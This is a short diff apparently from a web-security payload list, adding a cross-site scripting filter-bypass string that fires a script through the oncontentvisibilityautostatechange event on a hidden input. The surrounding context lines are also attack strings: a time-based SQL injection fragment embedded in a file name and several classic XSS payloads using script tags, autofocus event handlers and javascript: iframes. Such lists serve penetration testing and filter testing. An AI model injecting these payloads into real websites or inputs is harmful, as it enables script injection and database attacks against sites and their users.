@@ -394,3 +394,4 @@ sleep(10)-- -.jpg
 <svg><script>alert(1)</script></svg>
 <input onfocus=alert(1) autofocus>
 <iframe src="javascript:alert(1)"></iframe>
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
